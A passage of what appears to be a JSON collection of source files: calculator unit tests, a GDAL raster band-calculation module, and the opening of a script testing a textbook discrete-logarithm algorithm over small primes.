arcsin_angles = [-0.785, 0, 0.524, 0.629, 1 + 1j]\n        self.assert_function_values('arcsin', arcsin_inputs, arcsin_angles)\n        # Rather than a complex number, numpy.arcsin gives nan\n        self.assertTrue(numpy.isnan(calc.evaluator({}, {}, 'arcsin(-1.1)')))\n        self.assertTrue(numpy.isnan(calc.evaluator({}, {}, 'arcsin(1.1)')))\n\n        # Include those where the real part is between 0 and pi\n        arccos_inputs = ['1', '0.866', '0.809', '0.834-0.989*j']\n        arccos_angles = [0, 0.524, 0.628, 1 + 1j]\n        self.assert_function_values('arccos', arccos_inputs, arccos_angles)\n        self.assertTrue(numpy.isnan(calc.evaluator({}, {}, 'arccos(-1.1)')))\n        self.assertTrue(numpy.isnan(calc.evaluator({}, {}, 'arccos(1.1)')))\n\n        # Has the same range as arcsin\n        arctan_inputs = ['-1', '0', '0.577', '0.727', '0.272 + 1.084*j']\n        arctan_angles = arcsin_angles\n        self.assert_function_values('arctan', arctan_inputs, arctan_angles)\n\n    def test_reciprocal_trig_functions(self):\n        \"\"\"\n        Test the reciprocal trig functions provided in calc.py\n\n        which are: sec, csc, cot, arcsec, arccsc, arccot\n        \"\"\"\n        angles = ['-pi/4', 'pi/6', 'pi/5', '5*pi/4', '9*pi/4', '1 + j']\n        sec_values = [1.414, 1.155, 1.236, -1.414, 1.414, 0.498 + 0.591j]\n        csc_values = [-1.414, 2, 1.701, -1.414, 1.414, 0.622 - 0.304j]\n        cot_values = [-1, 1.732, 1.376, 1, 1, 0.218 - 0.868j]\n\n        self.assert_function_values('sec', angles, sec_values)\n        self.assert_function_values('csc', angles, csc_values)\n        self.assert_function_values('cot', angles, cot_values)\n\n        arcsec_inputs = ['1.1547', '1.2361', '2', '-2', '-1.4142', '0.4983+0.5911*j']\n        arcsec_angles = [0.524, 0.628, 1.047, 2.094, 2.356, 1 + 1j]\n        self.assert_function_values('arcsec', arcsec_inputs, arcsec_angles)\n\n        arccsc_inputs = ['-1.1547', '-1.4142', '2', '1.7013', '1.1547', '0.6215-0.3039*j']\n        arccsc_angles = [-1.047, -0.785, 0.524, 0.628, 1.047, 1 + 1j]\n        self.assert_function_values('arccsc', arccsc_inputs, arccsc_angles)\n\n        # Has the same range as arccsc\n        arccot_inputs = ['-0.5774', '-1', '1.7321', '1.3764', '0.5774', '(0.2176-0.868*j)']\n        arccot_angles = arccsc_angles\n        self.assert_function_values('arccot', arccot_inputs, arccot_angles)\n\n    def test_hyperbolic_functions(self):\n        \"\"\"\n        Test the hyperbolic functions\n\n        which are: sinh, cosh, tanh, sech, csch, coth\n        \"\"\"\n        inputs = ['0', '0.5', '1', '2', '1+j']\n        neg_inputs = ['0', '-0.5', '-1', '-2', '-1-j']\n        negate = lambda x: [-k for k in x]\n\n        # sinh is odd\n        sinh_vals = [0, 0.521, 1.175, 3.627, 0.635 + 1.298j]\n        self.assert_function_values('sinh', inputs, sinh_vals)\n        self.assert_function_values('sinh', neg_inputs, negate(sinh_vals))\n\n        # cosh is even - do not negate\n        cosh_vals = [1, 1.128, 1.543, 3.762, 0.834 + 0.989j]\n        self.assert_function_values('cosh', inputs, cosh_vals)\n        self.assert_function_values('cosh', neg_inputs, cosh_vals)\n\n        # tanh is odd\n        tanh_vals = [0, 0.462, 0.762, 0.964, 1.084 + 0.272j]\n        self.assert_function_values('tanh', inputs, tanh_vals)\n        self.assert_function_values('tanh', neg_inputs, negate(tanh_vals))\n\n        # sech is even - do not negate\n        sech_vals = [1, 0.887, 0.648, 0.266, 0.498 - 0.591j]\n        self.assert_function_values('sech', inputs, sech_vals)\n        self.assert_function_values('sech', neg_inputs, sech_vals)\n\n        # the following functions do not have 0 in their domain\n        inputs = inputs[1:]\n        neg_inputs = neg_inputs[1:]\n\n        # csch is odd\n        csch_vals = [1.919, 0.851, 0.276, 0.304 - 0.622j]\n        self.assert_function_values('csch', inputs, csch_vals)\n        self.assert_function_values('csch', neg_inputs, negate(csch_vals))\n\n        # coth is odd\n        coth_vals = [2.164, 1.313, 1.037, 0.868 - 0.218j]\n        self.assert_function_values('coth', inputs, coth_vals)\n        self.assert_function_values('coth', neg_inputs, negate(coth_vals))\n\n    def test_hyperbolic_inverses(self):\n        \"\"\"\n        Test the inverse hyperbolic functions\n\n        which are of the form arc[X]h\n        \"\"\"\n        results = [0, 0.5, 1, 2, 1 + 1j]\n\n        sinh_vals = ['0', '0.5211', '1.1752', '3.6269', '0.635+1.2985*j']\n        self.assert_function_values('arcsinh', sinh_vals, results)\n\n        cosh_vals = ['1', '1.1276', '1.5431', '3.7622', '0.8337+0.9889*j']\n        self.assert_function_values('arccosh', cosh_vals, results)\n\n        tanh_vals = ['0', '0.4621', '0.7616', '0.964', '1.0839+0.2718*j']\n        self.assert_function_values('arctanh', tanh_vals, results)\n\n        sech_vals = ['1.0', '0.8868', '0.6481', '0.2658', '0.4983-0.5911*j']\n        self.assert_function_values('arcsech', sech_vals, results)\n\n        results = results[1:]\n        csch_vals = ['1.919', '0.8509', '0.2757', '0.3039-0.6215*j']\n        self.assert_function_values('arccsch', csch_vals, results)\n\n        coth_vals = ['2.164', '1.313', '1.0373', '0.868-0.2176*j']\n        self.assert_function_values('arccoth', coth_vals, results)\n\n    def test_other_functions(self):\n        \"\"\"\n        Test the non-trig functions provided in calc.py\n\n        Specifically:\n          sqrt, log10, log2, ln, abs,\n          fact, factorial\n        \"\"\"\n\n        # Test sqrt\n        self.assert_function_values(\n            'sqrt',\n            [0, 1, 2, 1024],  # -1\n            [0, 1, 1.414, 32]  # 1j\n        )\n        # sqrt(-1) is NAN not j (!!).\n\n        # Test logs\n        self.assert_function_values(\n            'log10',\n            [0.1, 1, 3.162, 1000000, '1+j'],\n            [-1, 0, 0.5, 6, 0.151 + 0.341j]\n        )\n        self.assert_function_values(\n            'log2',\n            [0.5, 1, 1.414, 1024, '1+j'],\n            [-1, 0, 0.5, 10, 0.5 + 1.133j]\n        )\n        self.assert_function_values(\n            'ln',\n            [0.368, 1, 1.649, 2.718, 42, '1+j'],\n            [-1, 0, 0.5, 1, 3.738, 0.347 + 0.785j]\n        )\n\n        # Test abs\n        self.assert_function_values('abs', [-1, 0, 1, 'j'], [1, 0, 1, 1])\n\n        # Test factorial\n        fact_inputs = [0, 1, 3, 7]\n        fact_values = [1, 1, 6, 5040]\n        self.assert_function_values('fact', fact_inputs, fact_values)\n        self.assert_function_values('factorial', fact_inputs, fact_values)\n\n        self.assertRaises(ValueError, calc.evaluator, {}, {}, \"fact(-1)\")\n        self.assertRaises(ValueError, calc.evaluator, {}, {}, \"fact(0.5)\")\n        self.assertRaises(ValueError, calc.evaluator, {}, {}, \"factorial(-1)\")\n        self.assertRaises(ValueError, calc.evaluator, {}, {}, \"factorial(0.5)\")\n\n    def test_constants(self):\n        \"\"\"\n        Test the default constants provided in calc.py\n\n        which are: j (complex number), e, pi, k, c, T, q\n        \"\"\"\n\n        # Of the form ('expr', python value, tolerance (or None for exact))\n        default_variables = [\n            ('i', 1j, None),\n            ('j', 1j, None),\n            ('e', 2.7183, 1e-4),\n            ('pi', 3.1416, 1e-4),\n            ('k', 1.3806488e-23, 1e-26),  # Boltzmann constant (Joules/Kelvin)\n            ('c', 2.998e8, 1e5),  # Light Speed in (m/s)\n            ('T', 298.15, 0.01),  # 0 deg C = T Kelvin\n            ('q', 1.602176565e-19, 1e-22)  # Fund. Charge (Coulombs)\n        ]\n        for (variable, value, tolerance) in default_variables:\n            fail_msg = \"Failed on constant '{0}', not within bounds\".format(\n                variable\n            )\n            result = calc.evaluator({}, {}, variable)\n            if tolerance is None:\n                self.assertEqual(value, result, msg=fail_msg)\n            else:\n                self.assertAlmostEqual(\n                    value, result,\n                    delta=tolerance, msg=fail_msg\n                )\n\n    def test_complex_expression(self):\n        \"\"\"\n        Calculate combinations of operators and default functions\n        \"\"\"\n\n        self.assertAlmostEqual(\n            calc.evaluator({}, {}, \"(2^2+1.0)/sqrt(5e0)*5-1\"),\n            10.180,\n            delta=1e-3\n        )\n        self.assertAlmostEqual(\n            calc.evaluator({}, {}, \"1+1/(1+1/(1+1/(1+1)))\"),\n            1.6,\n            delta=1e-3\n        )\n        self.assertAlmostEqual(\n            calc.evaluator({}, {}, \"10||sin(7+5)\"),\n            -0.567, delta=0.01\n        )\n        self.assertAlmostEqual(\n            calc.evaluator({}, {}, \"sin(e)\"),\n            0.41, delta=0.01\n        )\n        self.assertAlmostEqual(\n            calc.evaluator({}, {}, \"k*T/q\"),\n            0.025, delta=1e-3\n        )\n        self.assertAlmostEqual(\n            calc.evaluator({}, {}, \"e^(j*pi)\"),\n            -1, delta=1e-5\n        )\n\n    def test_explicit_sci_notation(self):\n        \"\"\"\n        Expressions like 1.6*10^-3 (not 1.6e-3) it should evaluate.\n        \"\"\"\n        self.assertEqual(\n            calc.evaluator({}, {}, \"-1.6*10^-3\"),\n            -0.0016\n        )\n        self.assertEqual(\n            calc.evaluator({}, {}, \"-1.6*10^(-3)\"),\n            -0.0016\n        )\n\n        self.assertEqual(\n            calc.evaluator({}, {}, \"-1.6*10^3\"),\n            -1600\n        )\n        self.assertEqual(\n            calc.evaluator({}, {}, \"-1.6*10^(3)\"),\n            -1600\n        )\n\n    def test_simple_vars(self):\n        \"\"\"\n        Substitution of variables into simple equations\n        \"\"\"\n        variables = {'x': 9.72, 'y': 7.91, 'loooooong': 6.4}\n\n        # Should not change value of constant\n        # even with different numbers of variables...\n        self.assertEqual(calc.evaluator({'x': 9.72}, {}, '13'), 13)\n        self.assertEqual(calc.evaluator({'x': 9.72, 'y': 7.91}, {}, '13'), 13)\n        self.assertEqual(calc.evaluator(variables, {}, '13'), 13)\n\n        # Easy evaluation\n        self.assertEqual(calc.evaluator(variables, {}, 'x'), 9.72)\n        self.assertEqual(calc.evaluator(variables, {}, 'y'), 7.91)\n        self.assertEqual(calc.evaluator(variables, {}, 'loooooong'), 6.4)\n\n        # Test a simple equation\n        self.assertAlmostEqual(\n            calc.evaluator(variables, {}, '3*x-y'),\n            21.25, delta=0.01  # = 3 * 9.72 - 7.91\n        )\n        self.assertAlmostEqual(\n            calc.evaluator(variables, {}, 'x*y'),\n            76.89, delta=0.01\n        )\n\n        self.assertEqual(calc.evaluator({'x': 9.72, 'y': 7.91}, {}, \"13\"), 13)\n        self.assertEqual(calc.evaluator(variables, {}, \"13\"), 13)\n        self.assertEqual(\n            calc.evaluator(\n                {'a': 2.2997471478310274, 'k': 9, 'm': 8, 'x': 0.6600949841121},\n                {}, \"5\"\n            ),\n            5\n        )\n\n    def test_variable_case_sensitivity(self):\n        \"\"\"\n        Test the case sensitivity flag and corresponding behavior\n        \"\"\"\n        self.assertEqual(\n            calc.evaluator({'R1': 2.0, 'R3': 4.0}, {}, \"r1*r3\"),\n            8.0\n        )\n\n        variables = {'t': 1.0}\n        self.assertEqual(calc.evaluator(variables, {}, \"t\"), 1.0)\n        self.assertEqual(calc.evaluator(variables, {}, \"T\"), 1.0)\n        self.assertEqual(\n            calc.evaluator(variables, {}, \"t\", case_sensitive=True),\n            1.0\n        )\n        # Recall 'T' is a default constant, with value 298.15\n        self.assertAlmostEqual(\n            calc.evaluator(variables, {}, \"T\", case_sensitive=True),\n            298, delta=0.2\n        )\n\n    def test_simple_funcs(self):\n        \"\"\"\n        Subsitution of custom functions\n        \"\"\"\n        variables = {'x': 4.712}\n        functions = {'id': lambda x: x}\n        self.assertEqual(calc.evaluator({}, functions, 'id(2.81)'), 2.81)\n        self.assertEqual(calc.evaluator({}, functions, 'id(2.81)'), 2.81)\n        self.assertEqual(calc.evaluator(variables, functions, 'id(x)'), 4.712)\n\n        functions.update({'f': numpy.sin})\n        self.assertAlmostEqual(\n            calc.evaluator(variables, functions, 'f(x)'),\n            -1, delta=1e-3\n        )\n\n    def test_function_case_insensitive(self):\n        \"\"\"\n        Test case insensitive evaluation\n\n        Normal functions with some capitals should be fine\n        \"\"\"\n        self.assertAlmostEqual(\n            -0.28,\n            calc.evaluator({}, {}, 'SiN(6)', case_sensitive=False),\n            delta=1e-3\n        )\n\n    def test_function_case_sensitive(self):\n        \"\"\"\n        Test case sensitive evaluation\n\n        Incorrectly capitilized should fail\n        Also, it should pick the correct version of a function.\n        \"\"\"\n        with self.assertRaisesRegexp(calc.UndefinedVariable, 'SiN'):\n            calc.evaluator({}, {}, 'SiN(6)', case_sensitive=True)\n\n        # With case sensitive turned on, it should pick the right function\n        functions = {'f': lambda x: x, 'F': lambda x: x + 1}\n        self.assertEqual(\n            6, calc.evaluator({}, functions, 'f(6)', case_sensitive=True)\n        )\n        self.assertEqual(\n            7, calc.evaluator({}, functions, 'F(6)', case_sensitive=True)\n        )\n\n    def test_undefined_vars(self):\n        \"\"\"\n        Check to see if the evaluator catches undefined variables\n        \"\"\"\n        variables = {'R1': 2.0, 'R3': 4.0}\n\n        with self.assertRaisesRegexp(calc.UndefinedVariable, 'QWSEKO'):\n            calc.evaluator({}, {}, \"5+7*QWSEKO\")\n        with self.assertRaisesRegexp(calc.UndefinedVariable, 'r2'):\n            calc.evaluator({'r1': 5}, {}, \"r1+r2\")\n        with self.assertRaisesRegexp(calc.UndefinedVariable, 'r1 r3'):\n            calc.evaluator(variables, {}, \"r1*r3\", case_sensitive=True)\n", "437": "import os\nimport numpy as np\nfrom geospace.gdal_calc import Calc\nfrom geospace._const import CREATION\nfrom geospace.raster import mosaic\nfrom geospace.utils import ds_name, context_file\nfrom multiprocessing import Pool, cpu_count\nfrom collections.abc import Iterable\n\n\ndef band_map(i, ras_multi, band_idx_multi, calc_arg, out_file):\n    tem_file = os.path.join(os.path.dirname(out_file),\n                            '_temp_' + os.path.splitext(\n                            os.path.basename(out_file))[0] +\n                            '_' + str(i) + '.tif')\n\n    if os.path.exists(tem_file):\n        return tem_file\n\n    ras_args = {chr(i + 65): ras\n                for i, ras in enumerate(ras_multi)}\n    band_args = {chr(i + 65) + '_band': int(band_idx)\n                 for i, band_idx in enumerate(band_idx_multi)}\n    input_args = {**ras_args, **band_args}\n\n    Calc(calc_arg, tem_file, creation_options=CREATION,\n         quiet=True, **input_args)\n\n    return tem_file\n\n\ndef check_iter(ds_multi, calc_args, band_idxs):\n    iter_ds_multi = isinstance(\n        ds_multi, Iterable) and not isinstance(ds_multi, str)\n    iter_calc_args = isinstance(\n        calc_args, Iterable) and not isinstance(calc_args, str)\n    if band_idxs is not None:\n        if iter_ds_multi:\n            iter_band_idxs = isinstance(band_idxs[0], Iterable)\n        else:\n            iter_band_idxs = isinstance(band_idxs, Iterable)\n    else:\n        iter_band_idxs = False\n\n    return iter_ds_multi, iter_calc_args, iter_band_idxs\n\n\ndef broadcast_args(ds_multi, calc_args, band_idxs):\n    iter_ds_multi, iter_calc_args, iter_band_idxs = check_iter(\n        ds_multi, calc_args, band_idxs)\n\n    if iter_ds_multi:\n        ds = ds_multi[0]\n    else:\n        ds = ds_multi\n\n    ds, ras = ds_name(ds)\n    if band_idxs is not None:\n        if iter_band_idxs and iter_calc_args:\n            if len(band_idxs) != len(calc_args):\n                raise Exception(\n                    'length of band list not equal to that of calc args')\n        elif iter_band_idxs:\n            calc_args = [calc_args] * len(band_idxs)\n        elif iter_calc_args:\n            band_idxs = [band_idxs] * len(calc_args)\n        else:\n            calc_args = [calc_args]\n            band_idxs = [band_idxs]\n    else:\n        n_band = ds.RasterCount\n        if iter_calc_args:\n            if len(calc_args) != n_band:\n                raise Exception(\n                    'calc args length not equal to band counts')\n        else:\n            calc_args = [calc_args] * n_band\n\n        if iter_ds_multi:\n            band_idxs = np.repeat(\n                np.arange(1, n_band + 1, dtype=int), len(ds_multi)).reshape(-1, len(ds_multi))\n        else:\n            band_idxs = np.arange(1, n_band + 1, dtype=int)\n\n    if not iter_ds_multi:\n        ds_multi = [ras]\n        band_idxs = np.array(band_idxs).reshape(len(band_idxs), 1)\n\n    return ds_multi, calc_args, band_idxs\n\n\ndef map_calc(ds_multi, calc_args, out_path, band_idxs=None, multiprocess=True):\n    iter_ds_multi = isinstance(\n        ds_multi, Iterable) and not isinstance(ds_multi, str)\n\n    if iter_ds_multi:\n        ds = ds_multi[0]\n    else:\n        ds = ds_multi\n\n    ds, ras = ds_name(ds)\n    out_file = context_file(ras, out_path)\n\n    if os.path.exists(out_file):\n        return out_file\n\n    ds_multi, calc_args, band_idxs = broadcast_args(\n        ds_multi, calc_args, band_idxs)\n\n    n = len(calc_args)\n    args = zip(np.arange(1, n + 1, dtype=int),\n               [ds_multi] * n, band_idxs,\n               calc_args, [out_file] * n)\n\n    if multiprocess:\n        with Pool(min(cpu_count() - 1, n)) as p:\n            tem_files = p.starmap(band_map, args)\n    else:\n        tem_files = []\n        for arg in args:\n            tem_files.append(band_map(*arg))\n\n    if len(tem_files) == 1:\n        os.rename(tem_files[0], out_file)\n    else:\n        mosaic(tem_files, out_file, separate=True)\n        [os.remove(f) for f in tem_files]\n\n    return out_file\n", "438": "#Copyright Nick Prowse 2019. Code Licenced under GNU GPL v3.\n#Version 12. 07/10/2019.\n#Programmed & tested in Python 3.XX only\n#This program tests the algorithm in prop234_py3.py - solving multiple Discrete Log Problems (DLPs) specified by user in ranges, via Proposition 2.34 (in J Hoffstein, J Pipher & J Silverman) using order of g mod p, where p is a prime number.\n#Prime list file should be a .CSV file with each prime separated by commas.\n#Ensure that \"prime_list_path\" and \"prime_list_filename\" are edited for the location of prime list file used.\n#The larger the prime file is that is used, the longer the factorisations will take!\n#It has been tested on Linux Mint v4.XX x64 using a prime list with primes upto 99,997 and was able to solve a DLP with a prime of xxx in xxx seconds.\n\nimport sys\nimport math\ntry:\n\tfrom math import gcd as bltin_gcd\nexcept ImportError:\n\tfrom fractions import gcd\nimport os\nimport itertools\nimport csv\nimport time\n\nprint(\"Copyright Nick Prowse 2019. Code Licenced under GNU GPL v3.\")\nprint(\"Version 12. 07/10/2019.\")\nprint(\"Programmed & tested in python 3.XX only.\")\nprint(\"---------------------------------------------------------------------\")\nprint(\"This program tests the algorithm in prop234.py - solving multiple Discrete Log Problems (DLPs) specified by user in ranges, via Proposition 2.34 (in J Hoffstein, J Pipher & J Silverman) using order of g mod p, where p is a prime number.\")\n#print(\"Results printed are three arrays ...\"\nprint(\"Prime list file should be a .CSV file with each prime separated by commas.\")\nprint(\"Ensure that \\\"prime_list_path\\\" and \\\"prime_list_filename\\\" are edited for the location of prime list file used.\")\nprint(\"The larger the prime file is that is used, the longer the factorisation will take!\")\nprint(\"It has been tested on Linux Mint v4.XX x64 using a prime list with primes upto 99,997 and was able to solve a DLP with a prime of xxx in xxx seconds\")\nprint(\"---------------------------------------------------------------------\")\n\t\ndef main():\n\tprime_list_path=\"/home/mint/Desktop/\"\n\tprime_list_filename=\"primes_upto_100000.csv\"\n\tprimefile=prime_list_path + prime_list_filename\n\tprint(\"primefile currently is: \"+str(primefile))\n\n\t#define prime list\n\t#print('Importing primes from csv file')\n\tprimes = csvfile_store_primes(primefile)\n\t#print('First ten primes are: '+str(primes[0:10]))\n\n\t#print(sys.version_info)\n\n\t#initialise g_values, p_values, and h_values\n\t\n\t#g_values = range(2,3)\n\tg_values = range(2,50)\n\tp_values = primes[0:201]\n\t#p_values = primes[0:1001]\n\t#h_values = range(2,201)\n\n\ttotal_g_values=len(g_values)\n\tprint(\"total_g_values: \"+str(total_g_values))\n\n\ttotal_p_values=len(p_values)\n\tprint(\"total_p_values: \"+str(total_p_values))\n\n\t#total_h_values=len(h_values)\n\t#print(\"total_h_values: \"+str(total_h_values)\n\n\tTotal_values = total_g_values * total_p_values \n\tprint(\"Total_values: \"+str(Total_values))\n\t#Grand_total_values = total_p_values * total_g_values * total_h_values\n\t#print(\"Grand_total_values: \"+str(Grand_total_values)\n\n\t#define counts for different types of results\n\tcount_nosolns=0\n\tcount_x_equals_0=0\n\tcount_normal_soln=0\n\tcount_needlargerprimelist=0\n\tcount_q_e_found=0\n\tcount_q_e_not_found=0\t\n\tcount_notprime=0\n\tcount_calc_xi_no_solns=0\n\tcount_order_not_prime=0\n\tcount_order_prime=0\n\tcount_xi_not_found=0\n\tcount_calc_xi_status_false=0\n\t\n\t#define lists for different types of results\n\tanswers_to_be_checked=[]\n\t#order_false_list=[]\n\tn_prime=[]\n\tq_e_nf_order_p_list=[]\n\n\t#dlp is:  g**x congruent to h mod p, where g, h and p are known, p prime.\n\n\tprint(\"======================================\")\n\n\tprint('Looping through values for g, p, & h..')\n\n\tprevious_calc_g_p=[]\n\tprevious_calc_orders=[]\n\tfor g in g_values:\n\t\tprint(\"---------------\")\n\t\tprint(\"g is:\",str(g))\t\t\n\t\torder = 0\t\t\n\t\t#h_values_no_solution = False\n\t\tfor p in p_values:\n\t\t\tg_p=str(g)+\"_\"+str(p)\n\t\t\t#print(\"g_p is:\",g_p)\n\t\t\t#print(\"p is:\",str(p))\n\t\t\t#print(\"====================================\"\t\n\t\t\t#print(\"p is: \"+str(p)\t\n\t\t\tif g % p == 0:\n\t\t\t\tcount_nosolns = count_nosolns + len(range(1,p+1))\n\t\t\t\t#print(str(g)+\" mod \"+str(p)+\" is 0!\")\n\t\t\t\t#input(\"Waiting for user..\")\n\n\t\t\telif g > p:\t\t\t\n\t\t\t\tg_old = g\t\t\t\t\n\t\t\t\tg_new = g % p\n\t\t\t\t#print(\"g:\",g_old,\"> p:\",p,\"- revised g_new is:\",g_new)\n\t\t\t\t#input(\"Waiting for user..\")\n\n\t\t\t\t# 2 < order <= p - 1\n\t\t\t\t#no_prim_roots = p - 1 #for F_p this is euler_phi(p) = p-1 since p is prime.\t\t\t\t\t\n\t\t\t\t\n\t\t\t\tif g_new == 1:\n\t\t\t\t\t#print(\"g_new is 1!\")\n\t\t\t\t\tcount_nosolns = count_nosolns + len(range(1,p+1))\n\t\t\t\t\t#input(\"Waiting for user..\")\n\t\t\t\telse:\n\t\t\t\t\t#print(\"g_new_p is:\",str(g_new)+\"_\"+str(p),\", g: \", g_old,\"> p:\",p,\"- revised g_new:\",g_new)\t\t\t\n\t\t\t\t\tg_new_p = str(g_new)+\"_\"+str(p)\n\t\t\t\t\tif g_new_p not in previous_calc_g_p:\n\t\t\t\t\t\t#if g_new !=2:\t\t\t\t\t\t\n\t\t\t\t\t\t#print(g_p,\" not in previous_calc_g_p\")\n\t\t\t\t\t\t#print(\"previous_calc_g_p:\",previous_calc_g_p)\n\t\t\t\t\t\t#input(\"Waiting for user..\")\t\t\t\t\t\t\n\t\t\t\t\t\t\n\n\t\t\t\t\t\tresult = Calc_prop_234(g_new,p,count_nosolns, count_order_not_prime, count_q_e_found, count_q_e_not_found, q_e_nf_order_p_list, primes, n_prime, count_order_prime, previous_calc_g_p, previous_calc_orders, count_x_equals_0, count_normal_soln, count_needlargerprimelist, answers_to_be_checked, count_calc_xi_no_solns, count_notprime, count_xi_not_found, count_calc_xi_status_false)\n\n\t\t\t\t\t\t#return count_nosolns, count_calc_xi_no_solns, count_normal_soln, answers_to_be_checked, count_x_equals_0, count_needlargerprimelist, count_notprime, q_e_nf_order_p_list, count_xi_not_found, count_calc_xi_status_false, previous_calc_orders\n\n\t\t\t\t\t    #x_final=result[0]\n\t\t\t\t\t\tcount_nosolns=result[0]\n\t\t\t\t\t\tcount_calc_xi_no_solns=result[1]\n\t\t\t\t\t\tcount_normal_soln=result[2]\n\t\t\t\t\t\t#x_moduli_final=result[4]\n\t\t\t\t\t\tanswers_to_be_checked=result[3]\n\t\t\t\t\t\tcount_x_equals_0=result[4]\n\t\t\t\t\t\tcount_needlargerprimelist=result[5]\n\t\t\t\t\t\tcount_notprime=result[6]\n\t\t\t\t\t\tq_e_nf_order_p_list=result[7]\n\t\t\t\t\t\tcount_xi_not_found=result[8]\n\t\t\t\t\t\tcount_calc_xi_status_false=result[9]\n\t\t\t\t\t\tprevious_calc_orders=result[10]\n\n\t\t\t\t\telse:\n\t\t\t\t\t\t#print(g_p,\" is in previous_calc_g_p!\")\n\t\t\t\t\t\t\n\t\t\t\t\t\t#pos_g_new_p = previous_calc_g_p.index(g_new_p)\n\t\t\t\t\t\t#order=previous_calc_orders[pos_g_new_p][1]\n\t\t\t\t\t\torder=previous_calc_orders[previous_calc_g_p.index(g_new_p)][1]\n\t\t\t\t\t\t#print(\"Index of g_new_p:\",g_new_p,\" in previous_calc_g_p:\",previous_calc_g_p.index(g_new_p))\n\t\t\t\t\t\t#print(\"g_p:\",g_p,\"- Order for g_new_p:\",g_new_p,\" in previous_calc_orders:\",order)\n\t\t\t\t\t\t#input(\"Waiting for user..\")\n\n\t\t\t\t\t\t\n\t\t\t\t\t\t#for order_prev_calc in previous_calc_orders:\n\t\t\t\t\t\t#\tif order_prev_calc[0]== g_new_p:\n\t\t\t\t\t\t#\t\torder=order_prev_calc[1]\n\t\t\t\t\t\t#\t\tprint(g_new_p,\" is in previous_calc_g_p! - order:\",order)\n\t\t\t\t\t\t#\t\t#input(\"Waiting for user..\")\n\t\t\t\t\t\t#\t\tbreak\n\n\t\t\t\t\t\t#print(\"previous_calc_orders:\",previous_calc_orders)\n\t\t\t\t\t\t#print(\"previous_calc_orders for\",g_p,previous_calc_orders.index(str(g_new)+\"_\"+str(p)))\n\t\t\t\t\t\t#input(\"Waiting for user..\")\n\n\t\t\telif g_p in previous_calc_g_p:\n\t\t\t\t\n\t\t\t\tprint(g_p,\" is in previous_calc_g_p!\")\n\t\t\t\tinput(\"Waiting for user..\")\n\n\t\t\telif g_p not in previous_calc_g_p:\n\t\t\t\t#if g !=2:\t\t\t\t\t\t\n\t\t\t\t\t#print(str(g)+\"_\"+str(p)+\" not in previous_calc_g_p\")\n\n\t\t\t\t#input(\"Waiting for user..\")\n\t\t\t\tresult = Calc_prop_234(g,p,count_nosolns, count_order_not_prime, count_q_e_found, count_q_e_not_found, q_e_nf_order_p_list, primes, n_prime, count_order_prime, previous_calc_g_p, previous_calc_orders, count_x_equals_0, count_normal_soln, count_needlargerprimelist, answers_to_be_checked, count_calc_xi_no_solns, count_notprime, count_xi_not_found, count_calc_xi_status_false)\n\n\t\t\t\t#x_final=result[0]\n\t\t\t\tcount_nosolns=result[0]\n\t\t\t\tcount_calc_xi_no_solns=result[1]\n\t\t\t\tcount_normal_soln=result[2]\n\t\t\t\t#x_moduli_final=result[4]\n\t\t\t\tanswers_to_be_checked=result[3]\n\t\t\t\tcount_x_equals_0=result[4]\n\t\t\t\tcount_needlargerprimelist=result[5]\n\t\t\t\tcount_notprime=result[6]\n\t\t\t\tq_e_nf_order_p_list=result[7]\n\t\t\t\tcount_xi_not_found=result[8]\n\t\t\t\tcount_calc_xi_status_false=result[9]\n\t\t\t\tprevious_calc_orders=result[10]\n\n\t\t\t\n\n\n\t#print(\"Grand_total_considered: \"+str(Grand_total_values)+\", total_g_values: \"+str(total_g_values)+\", total_p_values: \"+str(total_p_values)+\", total_h_values: \"+str(total_h_values)+\", number_no_solns: \"+str(count_nosolns)+\", largerprimelist: \"+str(count_needlargerprimelist)+\", count_q_e_found: \"+str(count_q_e_found)+\", count_q_e_not_found: \"+str(count_q_e_not_found)+\", count_order_prime: \"+str(count_order_prime)+\", count_order_not_prime: \"+str(count_order_not_prime)+\", count_xi_not_found: \"+str(count_xi_not_found)+\", count_calc_xi_status_false: \"+str(count_calc_xi_status_false))\n\n\tprint(\"total_g_values: \"+str(total_g_values)+\", total_p_values: \"+str(total_p_values)+\", number_no_solns: \"+str(count_nosolns)+\", largerprimelist: \"+str(count_needlargerprimelist)+\", count_q_e_found: \"+str(count_q_e_found)+\", count_q_e_not_found: \"+str(count_q_e_not_found)+\", count_order_prime: \"+str(count_order_prime)+\", count_order_not_prime: \"+str(count_order_not_prime)+\", count_xi_not_found: \"+str(count_xi_not_found)+\", count_calc_xi_status_false: \"+str(count_calc_xi_status_false))\n\ndef Calc_prop_234(g,p,count_nosolns, count_order_not_prime, count_q_e_found, count_q_e_not_found, q_e_nf_order_p_list, primes, n_prime, count_order_prime, previous_calc_g_p, previous_calc_orders, count_x_equals_0, count_normal_soln, count_needlargerprimelist, answers_to_be_checked, count_calc_xi_no_solns, count_notprime, count_xi_not_found, count_calc_xi_status_false):\n\n\t#print(\"Running Calc_prop_234(\",g,\",\",p,\")\")\n\t\n\t#print(\"previous_calc_g_p:\",previous_calc_g_p)\n\t#input(\"Waiting for user..\")\n\tif str(g)+\"_\"+str(p) in previous_calc_g_p:\n\t\t#Order for g & p has already been calculated previously\n\t\tprint(\"Order for g:\",g,\",p:\",p,\"has already been calculated previously\")\n\t\tinput(\"Waiting for user..\")\n\t\torder=\"\"\n\n\n\n\n\t\treturn count_nosolns, count_calc_xi_no_solns, count_normal_soln, answers_to_be_checked, count_x_equals_0, count_needlargerprimelist, count_notprime, q_e_nf_order_p_list, count_xi_not_found, count_calc_xi_status_false, previous_calc_orders\n\n\n\telif str(g)+\"_\"+str(p) not in previous_calc_g_p:\n\t\tg_p_to_append=str(g)+\"_\"+str(p)\n\t\t#g_p_to_append.append(str(g)+\"_\"+str(p))\n\t\tprevious_calc_g_p.append(g_p_to_append)\n\n\t\tif g == 1:\n\t\t\t#order = Not found!\n\t\t\tprint(\"order not found - g = 1\")\n\t\t\tcount_nosolns = count_nosolns + 1\n\t\t\tcount_order_not_prime = count_order_not_prime + 1\n\t\t\tcount_q_e_not_found = count_q_e_not_found + 1\n\t\t\torder=\"Not found\"\n\n\t\t\tg_p_order_to_append=[]\n\t\t\tg_p_order_to_append.append(g_p_to_append)\n\t\t\tg_p_order_to_append.append(str(order))\n\t\t\tprevious_calc_orders.append(g_p_order_to_append)\n\n\t\telse:\n\t\t\t#print(\"previous_calc_orders:\",previous_calc_orders)\n\t\t\t#input(\"waiting for user..\")\n\t\t\tif g_p_to_append in previous_calc_orders:\n\t\t\t\tprint(\"g_p_to_append:\",g_p_to_append,\" is in 